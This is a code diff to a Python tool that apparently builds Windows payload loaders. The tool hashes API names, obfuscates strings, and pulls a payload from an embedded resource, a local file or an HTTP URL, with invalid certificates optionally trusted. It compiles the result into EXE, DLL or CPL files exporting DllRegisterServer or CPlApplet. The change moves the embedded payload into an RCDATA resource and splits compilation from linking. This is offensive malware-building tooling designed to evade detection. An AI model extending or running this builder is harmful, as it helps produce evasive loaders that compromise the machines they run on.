@@ -32,7 +32,7 @@ def _get_api_hashes():
         "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest", "WinHttpSendRequest",
         "WinHttpReceiveResponse", "WinHttpQueryDataAvailable", "WinHttpReadData",
         "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders",
-        "RtlZeroMemory"
+        "RtlZeroMemory", "FindResourceA", "LoadResource", "LockResource", "SizeofResource"
     ]
     module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
     
@@ -45,9 +45,10 @@ def _get_api_hashes():
         
     return hashes
 
-def _build_compiler_command(options, temp_c_filename, temp_def_filename, output_artifact_filename):
-    """A helper function to build the GCC compiler command list."""
-    command = ["x86_64-w64-mingw32-gcc", "-O2"]
+def _build_linker_command(options, object_files, temp_def_filename, output_artifact_filename):
+    """A helper function to build the final GCC linker command list."""
+    command = ["x86_64-w64-mingw32-gcc"]
+    command.extend(object_files)
 
     if options.get('debug_mode') != 'true':
         command.append("-s")
@@ -59,8 +60,8 @@ def _build_compiler_command(options, temp_c_filename, temp_def_filename, output_
             command.append("-lshell32")
         if temp_def_filename:
             command.append(temp_def_filename)
-
-    command.extend([temp_c_filename, "-o", output_artifact_filename])
+    
+    command.extend(["-o", output_artifact_filename])
     
     return command
 
@@ -85,14 +86,19 @@ def encode(input_filepath, original_filename, options):
             template_vars.update(_get_api_hashes())
 
         data_source_choice = options.get('data_source', 'embedded')
+        if data_source_choice == 'embedded':
+             template_vars['data_source_partial'] = "partials/datasource_resource.c.j2"
+        else:
+             template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
+        
         template_vars['data_source'] = data_source_choice
-        template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
         obfuscate_strings = options.get('obfuscate_strings') == 'true'
         template_vars['obfuscate_strings'] = obfuscate_strings
 
+        object_files_to_link = []
+
         if data_source_choice == 'file':
             template_vars['file_path'] = options.get('file_path', '').replace('\\', '\\\\')
-            template_vars['bytecode_array'] = ""
         elif data_source_choice == 'http':
             url = options.get('url', '')
             user_agent = options.get('user_agent', 'Mozilla/5.0')
@@ -105,11 +111,30 @@ def encode(input_filepath, original_filename, options):
                 template_vars['url'] = url.replace('\\', '\\\\')
                 template_vars['user_agent'] = user_agent
             template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0
-            template_vars['bytecode_array'] = ""
-        else: # embedded
+        else: # 'embedded'
             with open(input_filepath, "rb") as f:
-                bytecode_to_embed = f.read()
-            template_vars['bytecode_array'] = ", ".join([f"0x{byte:02x}" for byte in bytecode_to_embed])
+                payload_bytes = f.read()
+
+            temp_bin_filename = f"{uuid.uuid4()}.bin"
+            temp_bin_filepath = os.path.join('/tmp/uploads', temp_bin_filename)
+            temp_files_to_clean.append(temp_bin_filepath)
+            with open(temp_bin_filepath, "wb") as f_bin:
+                f_bin.write(payload_bytes)
+
+            rc_content = f'101 RCDATA "{temp_bin_filename}"'
+            temp_rc_filename = f"{uuid.uuid4()}.rc"
+            temp_rc_filepath = os.path.join('/tmp/uploads', temp_rc_filename)
+            temp_files_to_clean.append(temp_rc_filepath)
+            with open(temp_rc_filepath, "w") as f_rc:
+                f_rc.write(rc_content)
+
+            temp_res_o_filename = f"{uuid.uuid4()}.o"
+            temp_res_o_filepath = os.path.join('/tmp/uploads', temp_res_o_filename)
+            temp_files_to_clean.append(temp_res_o_filepath)
+            windres_command = ["x86_64-w64-mingw32-windres", "-i", temp_rc_filepath, "-o", temp_res_o_filepath]
+            print(f"INFO: Compiling resource object with command: {' '.join(windres_command)}")
+            subprocess.run(windres_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
+            object_files_to_link.append(temp_res_o_filepath)
 
         output_format = options.get('output_format', 'exe')
         export_name = 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer')
@@ -131,6 +156,14 @@ def encode(input_filepath, original_filename, options):
         temp_files_to_clean.append(temp_c_filepath)
         with open(temp_c_filepath, "w") as f:
             f.write(c_source_code)
+            
+        temp_c_o_filename = f"{uuid.uuid4()}.o"
+        temp_c_o_filepath = os.path.join('/tmp/uploads', temp_c_o_filename)
+        temp_files_to_clean.append(temp_c_o_filepath)
+        compile_command = ["x86_64-w64-mingw32-gcc", "-O2", "-c", temp_c_filepath, "-o", temp_c_o_filepath]
+        print(f"INFO: Compiling C object with command: {' '.join(compile_command)}")
+        subprocess.run(compile_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
+        object_files_to_link.append(temp_c_o_filepath)
 
         temp_def_filename = None
         if output_format in ['dll', 'cpl']:
@@ -144,13 +177,13 @@ def encode(input_filepath, original_filename, options):
         base_name, _ = os.path.splitext(original_filename)
         output_artifact_filename = f"{base_name}.{output_format}"
         
-        compiler_command = _build_compiler_command(
-            options, temp_c_filename, temp_def_filename, output_artifact_filename
+        linker_command = _build_linker_command(
+            options, object_files_to_link, temp_def_filename, output_artifact_filename
         )
 
-        print(f"INFO: Compiling with command: {' '.join(compiler_command)}")
+        print(f"INFO: Linking with command: {' '.join(linker_command)}")
         subprocess.run(
-            compiler_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads'
+            linker_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads'
         )
         print(f"INFO: Compilation successful. Artifact: {output_artifact_filename}")
 
@@ -163,3 +196,4 @@ def encode(input_filepath, original_filename, options):
         for f_path in temp_files_to_clean:
             if os.path.exists(f_path):
                 os.remove(f_path)
+
